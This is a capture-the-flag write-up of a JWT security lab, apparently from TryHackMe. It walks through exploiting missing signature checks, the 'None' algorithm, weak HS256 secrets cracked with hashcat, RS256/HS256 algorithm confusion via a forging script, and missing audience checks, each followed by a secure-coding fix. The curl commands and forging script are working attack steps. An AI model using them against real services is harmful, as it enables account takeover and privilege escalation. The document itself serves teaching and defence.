# JWT Security

## Task 1 - Task 3 Questions
* What is the common header used to transport the JWT in a request? Authorization: Bearer
* HS256 is an example of what type of signing algorithm? Symmetric
* RS256 is an example of what type of signing algorithm? Asymmetric
* What is the name used for encrypted JWTs? JWE
<br /><br />

## Task 4: Risk - Sensitive Information Disclosure 

IRL example: ViDay, <a href="https://www.cve.org/CVERecord?id=CVE-2025-40646">CVE-2025-40646</a>, 5.9 Medium. 

Unlike with cookies-based session management, token claims are may expose sensitive data as the entire JWT is sent client-side. Sensitive information may be disclosed without additional precautions taken on the dev side:  
* Credential disclosure with the password hash, or even worse, the clear-text password being sent as a Claim.    
* Exposure of internal network information such as the private IP or hostname of the authentication server.

Practical example in Terminal (bash): 
```bash
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "*******" }'
\ http://10.64.XXX.XX/api/v1.0/example1

{
"token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJwYXNzd29yZCI6InBhc3N3b3JkMSIsImFkbWluIjowLCJmbGFnIjoiVEhNezljYzAzOWNjLWQ4NWYtNDVkMS1hYzNiLTgxOGM4MzgzYTU2MH0ifQ.TkIH_A1zu1mu-zu6_9w_R4FUlYadkyjmXWyD5sqWd5U"
}
```
The Claim - or the part that of the JWT string that comes after the 1st dot and prior to the 2nd dot. Decoded from base64 encoding via JWT.io, CyberChecf or cli tools:  
```json
{
    "username": "user",
    "password": "*******",
    "admin": 0,
    "flag": "THM{9cc039cc-xxxxxxxxXXX-YYYYYYYYYYYYYYYYY}"
}        
```


### The Dev Mistake

In the example, sensitive information was added to the claim, as shown below    

```python 
import jwt 
#...
payload = {
    "username" : username,
    "password" : *******,
    "admin" : 0,
    "flag" : "THM{9cc039cc-xxxxxxxxXXX-YYYYYYYYYYYYYYYYY}"
}

access_token = jwt.encode(payload, self.secret, algorithm="HS256")
```

### The Fix

Values such as the password or flag should not be added as claims as the JWT will be sent client-side.
Instead, these values should be securely stored server-side in the backend. 

When required, the username can be read from a verified JWT and used to lookup these values, as shown in the example below:

```python
payload = jwt.decode(token, self.secret, algorithms="HS256")

username = payload['username']
flag = self.db_lookup(username, "flag")
```
<br />




## Task 5:  Signature Validation Mistakes - Practical Example 2

IRL example: ConvoyPanel, <a href="https://www.cve.org/CVERecord?id=CVE-2026-33746">CVE-2026-33746</a>, 9.8 Critical. 

2nd common mistake with JWTs is not correctly verifying the signature. 

If the signature isn't correctly verified, a threat actor may be able to forge a valid JWT token to gain access to another user's account. 

Not Verifying the Signature

The first issue with signature validation is when there is no signature validation. If the server does not verify the signature of the JWT, then it is possible to modify the claims in the JWT to whatever you prefer them to be. 

While it is uncommon to find APIs where no signature validation is performed, signature validation may have been omitted from a single endpoint within the API. Depending on the sensitivity of the endpoint, this can have a significant business impact.


```bash 
#authenticate to the API:
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password2" }' http://10.64.186.98/api/v1.0/example2

{
"token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4"
}
```

JWT.io:  
```json
//Header: 
{
    "typ": "JWT",
    "alg": "HS256"
}
//Claim: 
{
    "username": "user",
    "admin": 0
}
//Signature:
//    a-string-secret-at-least-256-bits-long
```

Try accessing the site via GET request with the above token: 
```bash 
curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4' http://10.64.186.98/api/v1.0/example2?username=user
{
"message": "Welcome user, you are not an admin"
}
```

Was able to verify the user without the signature below by removing the third part of the JWT (leaving only the dot), modifying the Claim's "admin" value to "1" and making the request again. The verification still worked, which allowed me to retrieve the flag and confirmed the signature wasn't being verified: 

```bash
#note the lack of data after the 2nd "." after "Authorization: Bearer " here: 
curl -vvv -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0." http://10.64.186.98/api/v1.0/example2?username=admin

Trying 10.64.186.98:80...
* Connected to 10.64.186.98 (10.64.186.98) port 80
> GET /api/v1.0/example2?username=admin HTTP/1.1
> Host: 10.64.186.98
> User-Agent: curl/8.5.0
> Accept: */*
> Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.
> 
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.4 Python/3.8.10
< Date: Sat, 21 Nov 2026 02:05:48 GMT
< Content-Type: application/json
< Content-Length: 113
< Connection: close
< 
{
"message": "Welcome admin, you are an admin, here is your flag: THM{6e32dca9-YYYY-xxxx-ZYZZZ-xYxYxYYYXXX}"
}
* Closing connection
```


### The Dev Mistake

Signature verification is skipped:
```python
payload = jwt.decode(token, options={'verify_signature': False})
```
While it is rare to see this on normal APIs, it often happens on server-to-server APIs. Imagine a threat actor already has initial access to your server - if a backend internal API skipps signature verification, this gives the threat actor direct access to the backend server by forging the server-to-server JWT. 

### The Fix

The JWT should always be verified or additional authentication factors, 
    such as certificates, should be used for server-to-server communication. 
The JWT can be verified by providing the secret (or public key), as shown in the example below:

```python
payload = jwt.decode(token, self.secret, algorithms="HS256")
```
<br /><br />





### Task 5: Downgrading "alg" to None - Practical Example 3:

IRL example: Microsoft, <a href="https://www.cve.org/CVERecord?id=CVE-2023-29357">CVE-2023-29357</a>, 9.8 Critical. 

Downgraded "alg" to "None" in header. Possible due to following API dev mistake: 
```python
payload = jwt.decode(token, options={'verify_signature': False})
```
which can be fixed by specifying the algorithm value: 
```python 
payload = jwt.decode(token, self.secret, algorithms="HS256")
```

Authenticated using this POST request: 
```bash
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "********" }'
\ http://10.64.186.98/api/v1.0/example3
{ 
"token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0._yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8"
}
```
Then, using CyberChef, I decoded the above token from POST response using "from Base-64 Encoded" to get the Header and Claim segments, altered the "alg" value, then re-encoded each segment using "to Base-64 Encoded" recipe:  
```json
//CyberChef: To Base64 (URL Safe): 
{ "typ": "JWT","alg": "None" } 
//result: eyAidHlwIjogIkpXVCIsImFsZyI6ICJOb25lIiB9

//CyberChef: To Base64 (URL Safe): 
{ "username": "user","admin": 1 }  
//eyAidXNlcm5hbWUiOiAidXNlciIsImFkbWluIjogMSB9

//The altered JWT token reassembled for the GET request:  
eyAidHlwIjogIkpXVCIsImFsZyI6ICJOb25lIiB9.eyAidXNlcm5hbWUiOiAidXNlciIsImFkbWluIjogMSB9.
```

then, ran curl GET request with the above modified JWT token & username=admin to get the flag: 
```bash 
curl -vvv -H "Authorization: Bearer eyAidHlwIjogIkpXVCIsImFsZyI6ICJOb25lIiB9.eyAidXNlcm5hbWUiOiAidXNlciIsImFkbWluIjogMSB9." http://10.64.186.98/api/v1.0/example3?username=admin

*   Trying 10.64.186.98:80...
* Connected to 10.64.186.98 (10.64.186.98) port 80
> GET /api/v1.0/example3?username=admin HTTP/1.1
> Host: 10.64.186.98
> User-Agent: curl/8.5.0
> Accept: */*
> Authorization: Bearer eyAidHlwIjogIkpXVCIsImFsZyI6ICJOb25lIiB9.eyAidXNlcm5hbWUiOiAidXNlciIsImFkbWluIjogMSB9.
> 
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.4 Python/3.8.10
< Date: Sat, 21 Nov 2026 02:36:48 GMT
< Content-Type: application/json
< Content-Length: 113
< Connection: close
< 
{
"message": "Welcome admin, you are an admin, here is your flag: THM{fb9341e4-xxxx-YYYY-zzZZ-YYYYZZZZZZYYYYYY}"
}
* Closing connection
```
<br /><br />





### Task 5: Weak Symmetric Secrets - Practical Example 4

IRL example: Microsoft, <a href="https://www.cve.org/CVERecord?id=CVE-2026-73576">CVE-2026-73576</a>, 6.3 Medium. 

If a symmetric signing algorithm is used, the security of the JWT relies on the strength and entropy of the secret used. If a weak secret is used, it may be possible to perform offline cracking to recover the secret. 

Once the secret value is known, you can again alter the claims in your JWT and recalculate a valid signature using the secret.

Authenticated via POST to grab the JWT: 
```bash 
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password4" }' http://10.64.186.98/api/v1.0/example4
{
"token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.yN1f3Rq8b26KEUYHCZbEwEk6LVzRYtbGzJMFIF8i5HY"
}
```

Saved above JWT as .txt:
```bash  
echo 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.yN1f3Rq8b26KEUYHCZbEwEk6LVzRYtbGzJMFIF8i5HY' > jwt4.txt 
```

Download a common JWT secret list: 
```bash 
wget https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list
```

Used hashcat to crack the secret for above token. Looked up mode value (16500 - JWT (JSON Web Token)) <a href="https://github.com/hashcat/hashcat/blob/master/docs/hashcat-example-hashes.md">here</a>: 

```bash 
hashcat -m 16500 -a 0 jwt4.txt jwt.secrets.list  

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.yN1f3Rq8b26KEUYHCZbEwEk6LVzRYtbGzJMFIF8i5HY:xxYYzz

#...                                                         
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16500 (JWT (JSON Web Token))
Hash.Target......: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZS...F8i5HY
Time.Started.....: Sat Nov 21 03:10:26 2026 (0 secs)
Time.Estimated...: Sat Nov 21 03:10:26 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (jwt.secrets.list)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   131.5 kH/s (1.75ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 512/103965 (0.49%)
Rejected.........: 0/512 (0.00%)
Restore.Point....: 0/103965 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....:  -> 6ce33aa7-3edd-44eb-9060-74c61e3a96b1
Hardware.Mon.#1..: Util: 56%

Started: Sat Nov 21 03:09:44 2026
Stopped: Sat Nov 21 03:10:27 2026
```

Created python3 script to encode the new JWT with the cracked HS256 secret 

[screenshot]

which produced a forged re-signed JWT: 
```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9.JElSdmp47vBgoXPkZAdD8ImkmUm06q38redShCGR6uM```

Used curl GET request with the forged re-signed JWT token to obtain flag: 

```bash 
curl -vvv -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9.JElSdmp47vBgoXPkZAdD8ImkmUm06q38redShCGR6uM" http://10.64.186.98/api/v1.0/example4?username=admin

*   Trying 10.64.186.98:80...
* Connected to 10.64.186.98 (10.64.186.98) port 80
> GET /api/v1.0/example4?username=admin HTTP/1.1
> Host: 10.64.186.98
> User-Agent: curl/8.5.0
> Accept: */*
> Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9.JElSdmp47vBgoXPkZAdD8ImkmUm06q38redShCGR6uM
> 
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.4 Python/3.8.10
< Date: Sat, 21 Nov 2026 03:47:11 GMT
< Content-Type: application/json
< Content-Length: 113
< Connection: close
< 
{
"message": "Welcome admin, you are an admin, here is your flag: THM{e1679fef-zzzz-xxxx-yyyy-ZZZZZZZZZZ}"
}
* Closing connection
```
<br />



### Task 5: Signature Algorithm Confusion - Practical Example 5 

IRL example: xmidt-org, <a href="https://www.cve.org/CVERecord?id=CVE-2024-54150">CVE-2024-54150</a>, 8.7 High. 

If an asymmetric signing algorithm like RS256 is used alongside symmetric algorithms like HS256 without logical separation in the application code, it may be possible to downgrade the token's algorithm to HS256 and executed a Signature Algorithm Confusion attack. 

In these cases, some libraries would default back to using the public key as the secret for the symmetric signing algorithm. Since the public key is usually not hidden, you can forge a valid signature by using the HS256 algorithm in combination with the public key.

Once you verify it works, you can alter the claims to make yourself an admin and recover the flag by setting admin to 1 and username to admin.


Authenticated via curl POST to get the JWT token wit the public key embedded as a claim in the JWT: 
```bash 
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "*******" }' http://10.64.147.133/api/v1.0/example5
{
"public_key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHSoarRoLvgAk4O41RE0w6lj2e7TDTbFk62WvIdJFo/aSLX/x9oc3PDqJ0Qu1x06/8PubQbCSLfWUyM7Dk0+irzb/VpWAurSh+hUvqQCkHmH9mrWpMqs5/L+rluglPEPhFwdL5yWk5kS7rZMZz7YaoYXwI7Ug4Es4iYbf6+UV0sudGwc3HrQ5uGUfOpmixUO0ZgTUWnrfMUpy2dFbZp7puQS6T8b5EJPpLY+iojMb/rbPB34NrvJKU1F84tfvY8xtg3HndTNPyNWp7EOsujKZIxKF5/RdW+Qf9jjBMvsbjfCo0LiNVjpotiLPVuslsEWun+LogxR+fxLiUehSBb8ip",
"token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.kR4DjBkwFE9dzPNeiboHqkPhs52QQgaHcC2_UGCtJ3qo2uY-vANIC6qicdsfT37McWYauzm92xflspmSVvrvwXdC2DAL9blz3YRfUOcXJT03fVM7nGp8E7uWSBy9UESLQ6PBZ_c_dTUJhWg35K3d8Jao2czC0JGN3EQxhcCGtxJ1R7T9tzBMaqW-IRXfTCq3BOxVVF66ePEfvG7gdyjAnWrQFktRBIhU4LoYwem3UZ7PolFf0v2i6jpnRJzMpqd2c9oMHOjhCZpy_yJNl-1F_UBbAF1L-pn6SHBOFdIFt_IasJDVPr1Ybv75M26o8OBwUJ1KK_rwX41y5BCNGcks9Q"
}
```

Ran JWT thru JWT.io to observe the Header & Claim: 
<!-- ![JWT.io screenshot](images/jwt.io_screenshot.png) --> 
<img src="images/jwt.io_screenshot.png" alt="JWT.io screenshot" width="600"><br />

```json
{
"typ": "JWT",
"alg": "RS256"
}
{
"username": "user",
"admin": 0
}
```

Downgraded the algorithm from RS256 to HS256 bt running the slightly altered python script:
```python
import jwt

# disables that check for the current run only, without editing the jwt library itself: 
jwt.algorithms.HMACAlgorithm.prepare_key = lambda self, key: key.encode() if isinstance(key, str) else key

public_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHSoarRoLvgAk4O41RE0w6lj2e7TDTbFk62WvIdJFo/aSLX/x9oc3PDqJ0Qu1x06/8PubQbCSLfWUyM7Dk0+irzb/VpWAurSh+hUvqQCkHmH9mrWpMqs5/L+rluglPEPhFwdL5yWk5kS7rZMZz7YaoYXwI7Ug4Es4iYbf6+UV0sudGwc3HrQ5uGUfOpmixUO0ZgTUWnrfMUpy2dFbZp7puQS6T8b5EJPpLY+iojMb/rbPB34NrvJKU1F84tfvY8xtg3HndTNPyNWp7EOsujKZIxKF5/RdW+Qf9jjBMvsbjfCo0LiNVjpotiLPVuslsEWun+LogxR+fxLiUehSBb8ip"

payload = { 'username' : 'admin', 'admin' : 1 }
access_token = jwt.encode(payload, public_key, algorithm="HS256")

#test the token via decode() if something broke, it will error out before printing: 
jwt.decode(access_token, public_key, algorithms="HS256")

print (access_token)
```

Ran the above script to print the new forged JWT: 
```bash
/usr/bin/python3 pyjwt5.py 
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9.mXyEcGNUoUsGe8j19t6HjomEvH4xTbrfQlV9e3vrNxA
```

Tested to the GET request with the new forged JWT: 
```bash 
curl -vvv -i -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9.mXyEcGNUoUsGe8j19t6HjomEvH4xTbrfQlV9e3vrNxA" http://10.64.147.133/api/v1.0/example5?username=admin

*   Trying 10.64.147.133:80...
* Connected to 10.64.147.133 (10.64.147.133) port 80
> GET /api/v1.0/example5?username=admin HTTP/1.1
> Host: 10.64.147.133
> User-Agent: curl/8.5.0
> Accept: */*
> Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9.mXyEcGNUoUsGe8j19t6HjomEvH4xTbrfQlV9e3vrNxA
> 
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Server: Werkzeug/3.0.4 Python/3.8.10
Server: Werkzeug/3.0.4 Python/3.8.10
< Date: Sun, 22 Nov 2026 02:23:07 GMT
Date: Sun, 22 Nov 2026 02:23:07 GMT
< Content-Type: application/json
Content-Type: application/json
< Content-Length: 113
Content-Length: 113
< Connection: close
Connection: close

< 
{
"message": "Welcome admin, you are an admin, here is your flag: THM{f592dfe2-xxxx-ZzZZ-YYYz-ZZZZZZZZYYYYY}"
}
* Closing connection
```
<br />



### The Dev Mistake

The mistake in this example is similar to that of example 3 but a bit more complex. While the None algorithm is disallowed, 
the key issue stems from both symmetric and asymmetric signature algorithms being allowed, as shown in the example below:

```python
payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512", "RS256", "RS384", "RS512"])
```
Care should be given never to mix signature algorithms together as the secret parameter of the decode function can be confused between being a secret or a public key.
    

### The Fix

Logically separate the asymmetric & symmetric algorithms, for example:
```python
header = jwt.get_unverified_header(token)

algorithm = header['alg']
payload = "..."

if "RS" in algorithm:
    payload = jwt.decode(token, self.public_key, algorithms=["RS256", "RS384", "RS512"])
elif "HS" in algorithm:
    payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512"])

username = payload['username']
flag = self.db_lookup(username, "flag")
```
<br />




## Task 6: JWT Lifetimes - Practical Example 6

IRL example: xmidt-org, <a href="https://www.cve.org/CVERecord?id=CVE-2026-110024">CVE-2026-110024</a>, 6.8 Medium. 

In this example, the JWT implementation did not specify an exp value, meaning tokens are permanently persistent. Use the token below to recover your flag: 
```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.ko7EQiATQQzrQPwRO8ZTY37pQWGLPZWEvdWH0tVDNPU```

Confirmed the claim value of the above JWT using CyberChef:  
```json
//JWT Decode recipe result with "From base64" recipe: 
{
    "username": "user",
    "admin": 1
}
```

```bash 
curl -vvv -i -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.ko7EQiATQQzrQPwRO8ZTY37pQWGLPZWEvdWH0tVDNPU' http://10.64.147.133/api/v1.0/example6?username=admin
    
*   Trying 10.64.147.133:80...
* Connected to 10.64.147.133 (10.64.147.133) port 80
> GET /api/v1.0/example6?username=admin HTTP/1.1
> Host: 10.64.147.133
> User-Agent: curl/8.5.0
> Accept: */*
> Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.ko7EQiATQQzrQPwRO8ZTY37pQWGLPZWEvdWH0tVDNPU
> 
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Server: Werkzeug/3.0.4 Python/3.8.10
Server: Werkzeug/3.0.4 Python/3.8.10
< Date: Sun, 22 Nov 2026 02:39:40 GMT
Date: Sun, 22 Nov 2026 02:39:40 GMT
< Content-Type: application/json
Content-Type: application/json
< Content-Length: 113
Content-Length: 113
< Connection: close
Connection: close

< 
{
"message": "Welcome admin, you are an admin, here is your flag: THM{a450ae48-xxxx-yyyy-Zzzz-ZZZZZZZZZZ}"
}
* Closing connection
```

### The Dev Mistake
Without an "exp" value, the JWT'll be persistent for a longer than necessary amout of time. In the event that an exp claim isn't present, most JWT libraries would accept the token as valid if the signature is verified. 

### The Fix 
An exp value should be added to the claims. Once added, most libraries will include reviewing the expiry time of the JWT into their checks for validity. This can be done as shown in the example below:
```python
lifetime = datetime.datetime.now() + datetime.timedelta(minutes=5)

payload = { 'username' : username, 'admin' : 0, 'exp' : lifetime }

access_token = jwt.encode(payload, self.secret, algorithm="HS256")
```
<br />





## Task 7: Cross-Service Relay Attacks - Practical Example 7

IRL example: Apache, <a href="https://www.cve.org/CVERecord?id=CVE-2026-50627">CVE-2026-50627</a> 9.1 Critical / 8.1 High. 

JWTs are sometimes used in systems with a centralised authentication system that serves multiple applications. 
However, in some cases, we may want to restrict which applications are accessed with a JWT, especially when there are claims that should only be valid for certain applications. This can be done by using the audience claim.

If the audience claim isn't correctly enforced, a Cross-Service Relay attack can be executed to perform a privilege escalation attack.

Here there's 1 central auth server, example7, and two applications example7_appA and example7_appB. 

----------
----------

Authenticated to the central auth server - example7 - using the following data segment: 
-------        
```'{ "username" : "user", "password" : "*", "application" : "appA"}'```. 
```bash 

curl -i -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "*", "application" : "appA"}' http://10.64.134.146/api/v1.0/example7

HTTP/1.1 200 OK
Server: Werkzeug/3.0.4 Python/3.8.10
Date: Sun, 22 Nov 2026 03:55:22 GMT
Content-Type: application/json
Content-Length: 155
Connection: close

{
"token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MCwiYXVkIjoiYXBwQSJ9.sl-84cMLYjxsD7SCySnnv3J9AMII9NKgz0-0vcak9t4"
}
```

Using JWT.io, confirmed that the claim for the above token specifies the audience as "appA": 
```json
{
"username": "user",
"admin": 0,
"aud": "appA"
}
```

Used above token in both the admin and user requests you make to example7_appA and example7_appB. 
---------------

While appA accepts the token, it lets you know that "username=user" is not an admin:         
```bash 
curl -i -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MCwiYXVkIjoiYXBwQSJ9.sl-84cMLYjxsD7SCySnnv3J9AMII9NKgz0-0vcak9t4' http://10.64.134.146/api/v1.0/example7_appA?username=user
HTTP/1.1 200 OK
Server: Werkzeug/3.0.4 Python/3.8.10
Date: Sun, 22 Nov 2026 04:04:00 GMT
Content-Type: application/json
Content-Length: 54
Connection: close

{
"message": "Welcome user, you are not an admin"
}

curl -i -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MCwiYXVkIjoiYXBwQSJ9.sl-84cMLYjxsD7SCySnnv3J9AMII9NKgz0-0vcak9t4' http://10.64.134.146/api/v1.0/example7_appA?username=admin
HTTP/1.1 403 FORBIDDEN
#...server details same as above
{
"message": "Unauthorized, you are not an admin"
}
```

On the other hand, here, appB does not accept the token as the audience is incorrect:  
```bash 
curl -i -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MCwiYXVkIjoiYXBwQSJ9.sl-84cMLYjxsD7SCySnnv3J9AMII9NKgz0-0vcak9t4' http://10.64.134.146/api/v1.0/example7_appB?username=user
HTTP/1.1 403 FORBIDDEN
Server: Werkzeug/3.0.4 Python/3.8.10
Date: Sun, 22 Nov 2026 04:01:16 GMT
Content-Type: application/json
Content-Length: 59
Connection: close

{
"message": "JWT could not be read: Invalid audience"
}

curl -i -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MCwiYXVkIjoiYXBwQSJ9.sl-84cMLYjxsD7SCySnnv3J9AMII9NKgz0-0vcak9t4' http://10.64.134.146/api/v1.0/example7_appB?username=admin
HTTP/1.1 403 FORBIDDEN
#...
{
"message": "JWT could not be read: Invalid audience"
}
```

----------------
----------------

Authenticated to example7 using the following data segment -d: 
------------
'{ "username" : "user", "password" : "*", "application" : "appB"}' 

```bash 
curl -i -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "*", "application" : "appB"}' http://10.64.134.146/api/v1.0/example7

HTTP/1.1 200 OK
Server: Werkzeug/3.0.4 Python/3.8.10
Date: Sun, 22 Nov 2026 04:19:30 GMT
Content-Type: application/json
Content-Length: 155
Connection: close

{
"token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQiJ9.jrTcVTGY9VIo-a-tYq_hvRTfnB4dMi_7j98Xvm-xb6o"
}
```
It generated a token with "admin":1 and "aud":"appB".  

JWT.io helped verify that audience Claim "appB" was added and the user was an admin this time: 
```json 
{
"username": "user",
"admin": 1,
"aud": "appB"
}
```
The intent of this token is to allow Admin login to appB. 

The below demonstrates that a JWT intented to allow Admin access to appB unexpectedly allows Admin access  to both appA and appB.   
-----------
To test this token with admin:1 and audience claim "appB", we try the below GET requests to appA and app.   

appA with ?username=user & JWT containing claim "aud":"appB":  
```bash 
curl -i -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQiJ9.jrTcVTGY9VIo-a-tYq_hvRTfnB4dMi_7j98Xvm-xb6o' http://10.64.134.146/api/v1.0/example7_appA?username=user

HTTP/1.1 401 UNAUTHORIZED
Server: Werkzeug/3.0.4 Python/3.8.10
Date: Sun, 22 Nov 2026 04:25:37 GMT
Content-Type: application/json
Content-Length: 40
Connection: close

{
"message": "Invalid request made"
}
```

Even though the token was meant only for audience "appB", the lack of application-side enforcement allowed unintented admin login to appA: 
```bash
curl -i -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQiJ9.jrTcVTGY9VIo-a-tYq_hvRTfnB4dMi_7j98Xvm-xb6o' http://10.64.134.146/api/v1.0/example7_appA?username=admin

HTTP/1.1 200 OK
Server: Werkzeug/3.0.4 Python/3.8.10
Date: Sun, 22 Nov 2026 04:26:09 GMT
Content-Type: application/json
Content-Length: 113
Connection: close

{
"message": "Welcome admin, you are an admin, here is your flag: THM{f0d34fe1-zzzz-YYYY-xxxx-XXXXXXXXXX}"
}
```

appB with ?username=user & JWT containing claim with audience set to "appB":  
```bash
curl -i -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQiJ9.jrTcVTGY9VIo-a-tYq_hvRTfnB4dMi_7j98Xvm-xb6o' http://10.64.134.146/api/v1.0/example7_appB?username=user

HTTP/1.1 401 UNAUTHORIZED
#...
Content-Length: 40
#...

{
"message": "Invalid request made"
}
```

appB with ?username=admin & JWT containing claim with audience set to "appB", as expected:   
```bash
curl -i -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQiJ9.jrTcVTGY9VIo-a-tYq_hvRTfnB4dMi_7j98Xvm-xb6o' http://10.64.134.146/api/v1.0/example7_appB?username=admin

HTTP/1.1 200 OK
#...
Content-Length: 86
#...

{
"message": "Welcome admin, you are an admin, but there is no flag for you here"
}
```            


## The Issue: 

A JWT with Audience Claim ("aud": "appB") and Admin Claim ("admin":1) allowed unexpected Admin access to appA, while also granting expected Admin access to appB, demonstrating a potential Cross-Service Relay Attack. 

The above responses to the curl GET commands show that apps are not properly handling the JWT Audience Claim value. The JWT and misconfigured applications allow anyone with the forged token to gain "admin" access to appA despite the fact that JWT Audience Claim says there should only be "admin" access for appB. 

## The Fix: 

Each individual application (appA, appB...appN) that shares a central authentication server (example7) should verify the audience claim when decoding the token. For example: 

```python 
payload = jwt.decode(token, self.secret, audience=["appB"], algorithms="HS256") 
``` 



